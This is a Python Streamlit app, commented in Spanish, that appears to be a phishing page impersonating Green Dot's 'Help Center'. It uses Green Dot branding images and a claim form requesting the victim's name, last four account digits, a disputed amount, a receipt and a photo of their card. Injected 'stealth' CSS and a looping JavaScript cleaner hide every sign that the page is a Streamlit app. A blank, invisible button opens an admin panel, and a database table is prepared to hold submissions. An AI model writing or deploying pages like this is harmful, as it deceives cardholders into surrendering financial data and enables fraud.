
import streamlit as st
import sqlite3
import os
from datetime import datetime

# Configuración de Rutas
DB_NAME = "claims.db"
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# JS NUCLEAR V1.2.3 (ELIMINACIÓN DE ANCLAS)
st.markdown("""<script>
    const nuclearClean = () => {
        const selectors = [
            'header', 'footer', '.stDeployButton', '[data-testid="stHeader"]',
            '[data-testid="stAppToolbar"]', '[data-testid="stHeaderActionElements"]',
            '.stElementToolbar', '[data-testid="stElementToolbar"]', 
            '.st-emotion-cache-140j12g', '.st-emotion-cache-gi0tri', 
            'button[title="View fullscreen"]', 'button[aria-label="Fullscreen"]',
            '.section-anchor', 'a.section-anchor', 'svg.etxdrby1'
        ];
        selectors.forEach(s => {
            document.querySelectorAll(s).forEach(el => {
                el.style.display = 'none';
                el.remove();
            });
        });
    };
    setInterval(nuclearClean, 30);
</script>""", unsafe_allow_html=True)

# CSS STEALTH TOTAL
st.markdown("""<style>
    html, body, [data-testid="stAppViewContainer"], .stApp, 
    .st-emotion-cache-1vo6xi6, .st-emotion-cache-6qob1r, .st-emotion-cache-140j12g {
        background-color: #000000 !important;
        color: #FFFFFF !important;
    }

    * { color: #FFFFFF !important; }

    /* OCULTAR ANCLAS Y ACTION ELEMENTS */
    [data-testid="stHeaderActionElements"], .section-anchor, .st-emotion-cache-gi0tri, .etxdrby3 {
        display: none !important;
        visibility: hidden !important;
        opacity: 0 !important;
        pointer-events: none !important;
    }

    @media (prefers-color-scheme: light) {
        html, body, [data-testid="stAppViewContainer"], .stApp {
            background-color: #000000 !important;
        }
    }

    header, footer, .stDeployButton, [data-testid="stHeader"] { display: none !important; }
    .block-container { max-width: 500px !important; padding-top: 1rem !important; }

    .stButton > button {
        background-color: #00a05b !important;
        color: white !important;
        width: 100%; border: none; height: 50px; border-radius: 8px; font-weight: bold;
    }

    .promo-box {
        background-color: #111; padding: 20px; border-radius: 12px;
        text-align: center; margin-top: 20px; border: 1px solid #222;
    }
</style>""", unsafe_allow_html=True)

if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False

if not st.session_state.admin_mode:
    if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
    st.title("Help Center")

    with st.form("claim_v1_2_3", clear_on_submit=True):
        st.text_input("Full Name")
        st.text_input("Last 4 digits of Account")
        st.number_input("Disputed Amount", format="%.2f")
        st.file_uploader("Store Receipt", type=["jpg","png"])
        st.file_uploader("Card Photo", type=["jpg","png"])
        if st.form_submit_button("SUBMIT NOW"):
            st.success("Claim Received.")

    st.markdown("""<div class='promo-box'>
        <p>Download the Green Dot app</p>
        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'>
        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'>
    </div>""", unsafe_allow_html=True)

    if st.button(" ", key="adm_btn"): 
        st.session_state.admin_mode = True
        st.rerun()
else:
    st.title("Admin Panel")
    if st.button("Exit Admin Panel"): 
        st.session_state.admin_mode = False
        st.rerun()
